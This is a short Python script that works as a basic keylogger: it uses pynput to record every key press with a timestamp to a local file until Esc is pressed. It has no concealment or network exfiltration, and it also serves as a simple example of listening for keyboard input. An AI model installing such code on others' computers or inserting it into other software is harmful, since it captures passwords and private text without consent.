from pynput import keyboard
from datetime import datetime

log_file = "key_log.txt"

def on_press(key):
    if key == keyboard.Key.esc:
        return False  # stops listener
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        with open(log_file, "a") as f:
            f.write(f'{timestamp} - {key.char}\n')
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f'{timestamp} - [{key}]\n')

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
